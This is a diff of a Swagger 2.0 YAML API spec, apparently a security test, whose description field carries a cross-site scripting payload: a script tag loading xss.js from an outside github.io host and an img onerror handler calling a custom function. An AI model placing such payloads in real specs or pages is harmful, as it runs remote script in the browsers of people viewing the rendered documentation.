@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec1
   description: |
-    <script src='https://zerone0x01.github.io/xss.js'></script><a title='test' > test </a><img src='1' onerror='zerone0x01_xss()' />
+    <script src='https://zerone0x01.github.io/xss.js'></script><a title='test' > test </a><img src='1' onerror='zerone0x01_xss()'/>
 paths:
   /accounts:
     get:
